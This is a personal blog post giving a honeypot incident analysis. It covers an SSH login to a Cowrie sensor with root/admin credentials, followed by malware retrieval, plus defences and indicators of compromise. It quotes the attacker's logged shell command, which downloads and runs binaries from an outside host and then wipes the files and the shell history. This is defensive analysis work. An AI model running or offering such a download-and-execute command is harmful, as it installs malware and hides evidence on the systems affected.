<!DOCTYPE html>
<html lang="en">

<head>
  <title>
  ea73Malware · MoraCyberInsights
</title>
  <meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="color-scheme" content="light dark">




<meta name="author" content="Gabriel Mora">
<meta name="description" content="Time and Date of Activity 2024-05-25 13:19:55
Relevant Logs, Malware Analysis:Link to headingThere were 2 firewall logs for this IP. They were obtained manually from the honeypot by going to &ldquo;/var/log&rdquo; and using &ldquo;grep -r &lsquo;218.92.0.60&rsquo;&rdquo; to filter by source IP of the attacker.
**Date Time Source IP Source Port Target IP Target Port Protocol 2024-05-22 23:34:46 218.92.0.60 55026 172.31.19.98 22 6 2024-05-25 13:19:55 218.92.0.60 19903 172.31.19.98 22 6 Looked in the &ldquo;/srv/cowrie/var/lib/cowrie/downloads&rdquo; directory to see recent downloads.">
<meta name="keywords" content="blog,cybersecurity,personal">


  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="ea73Malware">
  <meta name="twitter:description" content="Time and Date of Activity 2024-05-25 13:19:55
Relevant Logs, Malware Analysis:Link to headingThere were 2 firewall logs for this IP. They were obtained manually from the honeypot by going to “/var/log” and using “grep -r ‘218.92.0.60’” to filter by source IP of the attacker.
**Date Time Source IP Source Port Target IP Target Port Protocol 2024-05-22 23:34:46 218.92.0.60 55026 172.31.19.98 22 6 2024-05-25 13:19:55 218.92.0.60 19903 172.31.19.98 22 6 Looked in the “/srv/cowrie/var/lib/cowrie/downloads” directory to see recent downloads.">

<meta property="og:url" content="https://moracyberinsights.github.io/posts/ea73malware/">
  <meta property="og:site_name" content="MoraCyberInsights">
  <meta property="og:title" content="ea73Malware">
  <meta property="og:description" content="Time and Date of Activity 2024-05-25 13:19:55
Relevant Logs, Malware Analysis:Link to headingThere were 2 firewall logs for this IP. They were obtained manually from the honeypot by going to “/var/log” and using “grep -r ‘218.92.0.60’” to filter by source IP of the attacker.
**Date Time Source IP Source Port Target IP Target Port Protocol 2024-05-22 23:34:46 218.92.0.60 55026 172.31.19.98 22 6 2024-05-25 13:19:55 218.92.0.60 19903 172.31.19.98 22 6 Looked in the “/srv/cowrie/var/lib/cowrie/downloads” directory to see recent downloads.">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-05-28T17:17:34-05:00">
    <meta property="article:modified_time" content="2024-05-28T17:17:34-05:00">




<link rel="canonical" href="https://moracyberinsights.github.io/posts/ea73malware/">


<link rel="preload" href="/fonts/fa-brands-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-regular-400.woff2" as="font" type="font/woff2" crossorigin>
<link rel="preload" href="/fonts/fa-solid-900.woff2" as="font" type="font/woff2" crossorigin>


  
  
  <link rel="stylesheet" href="/css/coder.min.38c4552ac40f9ae3408bad40358f654ebd8804412fe74ed56f2d6c8a7af82dd3.css" integrity="sha256-OMRVKsQPmuNAi61ANY9lTr2IBEEv507Vby1sinr4LdM=" crossorigin="anonymous" media="screen" />






  
    
    
    <link rel="stylesheet" href="/css/coder-dark.min.a00e6364bacbc8266ad1cc81230774a1397198f8cfb7bcba29b7d6fcb54ce57f.css" integrity="sha256-oA5jZLrLyCZq0cyBIwd0oTlxmPjPt7y6KbfW/LVM5X8=" crossorigin="anonymous" media="screen" />
  



 




<link rel="icon" type="image/svg+xml" href="/img/favicon.svg" sizes="any">
<link rel="icon" type="image/png" href="/img/favicon-32x32.png" sizes="32x32">
<link rel="icon" type="image/png" href="/img/favicon-16x16.png" sizes="16x16">

<link rel="apple-touch-icon" href="/images/apple-touch-icon.png">
<link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">

<link rel="manifest" href="/site.webmanifest">
<link rel="mask-icon" href="/images/safari-pinned-tab.svg" color="#5bbad5">









</head>






<body class="preload-transitions colorscheme-auto">
  
<div class="float-container">
    <a id="dark-mode-toggle" class="colorscheme-toggle">
        <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
    </a>
</div>


  <main class="wrapper">
    <nav class="navigation">
  <section class="container">
    
    <a class="navigation-title" href="https://moracyberinsights.github.io/">
      MoraCyberInsights
    </a>
    
    
      <input type="checkbox" id="menu-toggle" />
      <label class="menu-button float-right" for="menu-toggle">
        <i class="fa-solid fa-bars fa-fw" aria-hidden="true"></i>
      </label>
      <ul class="navigation-list">
        
          
            <li class="navigation-item">
              <a class="navigation-link " href="/posts/">Blog</a>
            </li>
          
            <li class="navigation-item">
              <a class="navigation-link " href="/about/">About</a>
            </li>
          
        
        
      </ul>
    
  </section>
</nav>


    <div class="content">
      
  <section class="container post">
    <article>
      <header>
        <div class="post-title">
          <h1 class="title">
            <a class="title-link" href="https://moracyberinsights.github.io/posts/ea73malware/">
              ea73Malware
            </a>
          </h1>
        </div>
        <div class="post-meta">
          <div class="date">
            <span class="posted-on">
              <i class="fa-solid fa-calendar" aria-hidden="true"></i>
              <time datetime="2024-05-28T17:17:34-05:00">
                May 28, 2024
              </time>
            </span>
            <span class="reading-time">
              <i class="fa-solid fa-clock" aria-hidden="true"></i>
              3-minute read
            </span>
          </div>
          
          
          
        </div>
      </header>

      <div class="post-content">
        
        <p><strong>Time and Date of Activity</strong> 2024-05-25 13:19:55</p>
<h3 id="relevant-logs-malware-analysis">
  Relevant Logs, Malware Analysis:
  <a class="heading-link" href="#relevant-logs-malware-analysis">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>There were 2 firewall logs for this IP. They were obtained manually from
the honeypot by going to &ldquo;/var/log&rdquo; and using &ldquo;grep -r &lsquo;218.92.0.60&rsquo;&rdquo; to
filter by source IP of the attacker.</p>
<table>
<thead>
<tr>
<th>**Date</th>
<th>Time</th>
<th>Source IP</th>
<th>Source Port</th>
<th>Target IP</th>
<th>Target Port</th>
<th>Protocol</th>
</tr>
</thead>
<tbody>
<tr>
<td>2024-05-22</td>
<td>23:34:46</td>
<td>218.92.0.60</td>
<td>55026</td>
<td>172.31.19.98</td>
<td>22</td>
<td>6</td>
</tr>
<tr>
<td>2024-05-25</td>
<td>13:19:55</td>
<td>218.92.0.60</td>
<td>19903</td>
<td>172.31.19.98</td>
<td>22</td>
<td>6</td>
</tr>
</tbody>
</table>
<p>Looked in the &ldquo;/srv/cowrie/var/lib/cowrie/downloads&rdquo; directory to see
recent downloads.</p>
<p>Grabbed the timestamp for hash download
&ldquo;ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73&rdquo; the
timestamp was &quot;13:21&quot;.</p>
<p>To get more logs for this activity I changed directory to
&ldquo;/srv/cowrie/var/log/cowrie/&rdquo; and used &ldquo;grep -r &quot;13:21&quot;&rdquo;.</p>
<p>After matching timestamp with the download hash I obtained the session
ID which was &quot;33e5803d9b75&quot;. In order to get all logs pertaining to
that session I used &ldquo;grep -r &quot;33e5803d9b75&quot;&rdquo;.</p>
<p>Sample of the connection:</p>
<p>cowrie.json.2024-05-25:{&quot;eventid&quot;:&quot;cowrie.login.success&quot;,&quot;username&quot;:&quot;root&quot;,&quot;password&quot;:&quot;admin&quot;,&quot;message&quot;:&quot;login
attempt [root/admin]
succeeded&quot;,&quot;sensor&quot;:&quot;&quot;,&quot;timestamp&quot;:&quot;2024-05-25T13:19:57.341835Z&quot;,&quot;src_ip&quot;:&quot;218.92.0.60&quot;,&quot;session&quot;:&quot;33e5803d9b75&quot;}</p>
<p>cowrie.json.2024-05-25:{&quot;eventid&quot;:&quot;cowrie.command.input&quot;,&quot;input&quot;:&quot;#!/bin/sh;
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;
wget http://43.249.172.195:888/112; curl -O
http://43.249.172.195:888/112; chmod +x 112; ./112; wget
http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s;
chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history
-c; &quot;,&quot;message&quot;:&quot;CMD: #!/bin/sh;
PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin;
wget http://43.249.172.195:888/112; curl -O
http://43.249.172.195:888/112; chmod +x 112; ./112; wget
http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s;
chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history
-c;
&quot;,&quot;sensor&quot;:&quot;&quot;,&quot;timestamp&quot;:&quot;2024-05-25T13:19:57.777096Z&quot;,&quot;src_ip&quot;:&quot;218.92.0.60&quot;,&quot;session&quot;:&quot;33e5803d9b75&quot;}</p>
<p>Sandbox malware analysis:</p>
<p><a href="https://www.hybrid-analysis.com/sample/ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73"  class="external-link" target="_blank" rel="noopener">https://www.hybrid-analysis.com/sample/ea40ecec0b30982fbb1662e67f97f0e9d6f43d2d587f2f588525fae683abea73</a></p>
<p>In this attack the script that was executed first modifies the &ldquo;PATH&rdquo;
environment variable to ensure that common system directories are
included like the ones used &ldquo;wget, curl, chmod, rm&rdquo;. After modifying
PATH the script attempts to download a file from 43.249.172.195 on port
888 using &ldquo;wget&rdquo; and &ldquo;curl&rdquo; probably for redundancy to ensure a more
successful attack. Then it executes the file followed by &ldquo;rm&rdquo; commands
to remove all files as well as running &ldquo;history -c&rdquo; to remove evidence
of execution.</p>
<h3 id="which-vulnerability-does-the-attack-attempt-to-exploit">
  Which vulnerability does the attack attempt to exploit?
  <a class="heading-link" href="#which-vulnerability-does-the-attack-attempt-to-exploit">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>This attack does not exploit a particular CVE. However, it does take
advantage of poor security configurations in order to upload the malware
to the system.</p>
<h3 id="what-is-the-goal-of-the-attack">
  What is the goal of the attack?
  <a class="heading-link" href="#what-is-the-goal-of-the-attack">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>The goal of this attack is to compromise the endpoint and gain
unauthorized access by downloading malware and executing it. It also
attempts to delete evidence of execution to hide and persist.</p>
<h3 id="if-the-system-is-vulnerable-do-you-think-the-attack-will-be-successful">
  If the system is vulnerable, do you think the attack will be successful?
  <a class="heading-link" href="#if-the-system-is-vulnerable-do-you-think-the-attack-will-be-successful">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Yes. If the system is vulnerable and there are no detections in place,
then this malware can install successfully and accomplish its end goal.</p>
<h3 id="how-can-a-system-be-protected-from-this-attack">
  How can a system be protected from this attack?
  <a class="heading-link" href="#how-can-a-system-be-protected-from-this-attack">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>Execution Prevention</p>
<p>Identify and block potentially malicious software executed that may be
executed through this technique by using application control tools, like
Windows Defender Application Control, AppLocker, or Software Restriction
Policies where appropriate.</p>
<p>Password Policies</p>
<p>Ensure that root accounts have complex, unique passwords across all
systems on the network.</p>
<p>Privileged Account Management</p>
<p>Follow best practices in restricting access to privileged accounts to
avoid hostile programs from accessing such sensitive information.</p>
<p>Network Traffic</p>
<p>Monitor and analyze traffic patterns and packet inspection associated to
protocol(s), leveraging SSL/TLS inspection for encrypted traffic, that
do not follow the expected protocol standards and traffic flows.</p>
<h3 id="what-do-you-know-about-the-attacker">
  What do you know about the attacker?
  <a class="heading-link" href="#what-do-you-know-about-the-attacker">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>• References</p>
<p>• ThreatIntel</p>
<p>• Whois Information</p>
<p>• Shodan</p>
<p>• CyberGordon</p>
<p>• AlienVault</p>
<p>• ISC</p>
<p>IP is based in China. It was first seen and reported to the Internet
Storm Center on 2023-05-10 and last seen on 2024-05-27. Based on the
score reports from several OSINT sites it can be determined that this IP
(218.92.0.60) was setup for malicious purposes. The same can be
determined of the IP that hosts the files that were used
(43.249.172.195).</p>
<p><a href="https://www.virustotal.com/gui/ip-address/218.92.0.60"  class="external-link" target="_blank" rel="noopener">https://www.virustotal.com/gui/ip-address/218.92.0.60</a></p>
<p><a href="https://isc.sans.edu/ipinfo/218.92.0.60"  class="external-link" target="_blank" rel="noopener">https://isc.sans.edu/ipinfo/218.92.0.60</a></p>
<p><a href="https://cybergordon.com/r/4e478049-66ec-426d-a355-464b7d285b03"  class="external-link" target="_blank" rel="noopener">https://cybergordon.com/r/4e478049-66ec-426d-a355-464b7d285b03</a></p>
<p><a href="https://otx.alienvault.com/indicator/ip/218.92.0.60"  class="external-link" target="_blank" rel="noopener">https://otx.alienvault.com/indicator/ip/218.92.0.60</a></p>
<p><a href="https://www.abuseipdb.com/check/218.92.0.60"  class="external-link" target="_blank" rel="noopener">https://www.abuseipdb.com/check/218.92.0.60</a></p>
<h3 id="indicators-of-compromise">
  Indicators of Compromise:
  <a class="heading-link" href="#indicators-of-compromise">
    <i class="fa-solid fa-link" aria-hidden="true" title="Link to heading"></i>
    <span class="sr-only">Link to heading</span>
  </a>
</h3>
<p>• IP List</p>
<p>218.92.0.60</p>
<p>43.249.172.195</p>
<p>Analyst Name: Gabriel Mora Ramos Date of Analysis: 5/28/2024</p>

      </div>


      <footer>
        


        
        
        
        
        

        
        
      </footer>
    </article>

    
  </section>

    </div>

    <footer class="footer">
  <section class="container">
    ©
    
      2017 -
    
    2024
     Gabriel Mora 
    ·
    
    Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/" target="_blank" rel="noopener">Coder</a>.
    
  </section>
</footer>

  </main>

  

  
  
  <script src="/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js" integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script>
  

  

  


  
  



  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
</body>

</html>
